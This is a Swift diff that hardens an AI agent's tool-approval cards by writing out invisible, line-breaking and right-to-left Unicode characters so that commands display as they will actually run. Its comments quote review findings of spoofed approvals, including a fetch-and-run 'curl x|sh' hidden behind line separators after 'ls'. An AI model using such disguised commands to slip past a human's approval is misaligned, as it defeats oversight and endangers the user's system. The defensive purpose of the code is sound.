@@ -5,7 +5,7 @@ import Foundation
 public enum ApprovalText {
     /// The card's question: "Run this command?", "Write release.sh?".
     public static func title(_ request: ApprovalRequest) -> String {
-        let file = filePath(request).map { ($0 as NSString).lastPathComponent }
+        let file = filePath(request).map { shown(($0 as NSString).lastPathComponent) }
         switch request.name {
         case "Bash": return "Run this command?"
         case "Edit", "MultiEdit", "NotebookEdit": return file.map { "Edit \($0)?" } ?? "Edit this file?"
@@ -22,11 +22,13 @@ public enum ApprovalText {
         let input = request.input
         switch request.name {
         case "Bash":
-            if let command = input["command"]?.stringValue, let line = firstLine(command) { return line }
+            // Named before it's split, so a U+2028 can't make `ls` alone
+            // look like the line that was allowed.
+            if let command = input["command"]?.stringValue, let line = firstLine(shown(command)) { return line }
         case "WebFetch":
-            if let url = input["url"]?.stringValue, !url.isEmpty { return "Fetch " + url }
+            if let url = input["url"]?.stringValue, !url.isEmpty { return "Fetch " + shown(url) }
         case "WebSearch":
-            if let query = input["query"]?.stringValue, !query.isEmpty { return "Search for " + query }
+            if let query = input["query"]?.stringValue, !query.isEmpty { return "Search for " + shown(query) }
         default:
             break
         }
@@ -44,6 +46,63 @@ public enum ApprovalText {
         case .answered: return "Answered"
         case .expired: return "Expired when the runner restarted"
         }
+    }
+
+    /// `text` as an approval card shows it: every character that would
+    /// break a line, hide, or reorder what's drawn is written out by name
+    /// instead (`⟨U+2028⟩`), as the shell reads it as an ordinary
+    /// character. Controls other than a line break and a tab, format
+    /// characters (bidi overrides and isolates, zero-width ones, the
+    /// byte-order mark), the line and paragraph separators, characters that
+    /// draw as nothing, spaces other than the plain one, and right-to-left
+    /// letters. A line
+    /// break and a tab are left: the shell reads those as they look. A
+    /// carriage return isn't: it draws as a new line, and bash reads it
+    /// as part of a word (security review, 9 Nov 2026: `ls`, six U+2028
+    /// and `;curl x|sh` looked like `ls` on its own). The runner lets
+    /// only the Mac connected straight to it allow such a call
+    /// (runner/src/tools.ts, HIDES_OR_REORDERS).
+    public static func shown(_ text: String) -> String {
+        guard text.unicodeScalars.contains(where: hides) else { return text }
+        var out = ""
+        out.unicodeScalars.reserveCapacity(text.unicodeScalars.count)
+        for scalar in text.unicodeScalars {
+            if hides(scalar) {
+                out += "\u{27E8}U+" + String(format: "%04X", scalar.value) + "\u{27E9}"
+            } else {
+                out.unicodeScalars.append(scalar)
+            }
+        }
+        return out
+    }
+
+    /// The same for a card's fields, keys and values.
+    public static func shown(_ fields: [ToolPresentation.Field]) -> [ToolPresentation.Field] {
+        fields.map { ToolPresentation.Field(key: shown($0.key), value: shown($0.value)) }
+    }
+
+    private static func hides(_ scalar: Unicode.Scalar) -> Bool {
+        if scalar == "\n" || scalar == "\t" { return false }
+        // Characters that draw as nothing though they're there (a combining
+        // grapheme joiner, variation selectors, Hangul fillers), spaces that
+        // aren't the shell's space, and the braille blank (Codex's review,
+        // 9 Nov 2026: `./deploy` + U+034F + `.sh` looked like `./deploy.sh`).
+        if scalar.properties.isDefaultIgnorableCodePoint || scalar.value == 0x2800 { return true }
+        if scalar.properties.generalCategory == .spaceSeparator { return scalar != " " }
+        // Right-to-left letters turn the `;` and `|` around them round with
+        // no control character at all, so the order drawn isn't the order run.
+        if rightToLeft(scalar.value) { return true }
+        switch scalar.properties.generalCategory {
+        case .control, .format, .lineSeparator, .paragraphSeparator: return true
+        default: return false
+        }
+    }
+
+    /// Hebrew, Arabic, Syriac, Thaana, N'Ko and the other right-to-left
+    /// scripts' blocks, and their presentation forms.
+    private static func rightToLeft(_ v: UInt32) -> Bool {
+        (0x0590...0x08FF).contains(v) || (0xFB1D...0xFDFF).contains(v) || (0xFE70...0xFEFF).contains(v)
+            || (0x10800...0x10FFF).contains(v) || (0x1E800...0x1EFFF).contains(v)
     }
 
     /// The file a request would write or edit, if it names one.
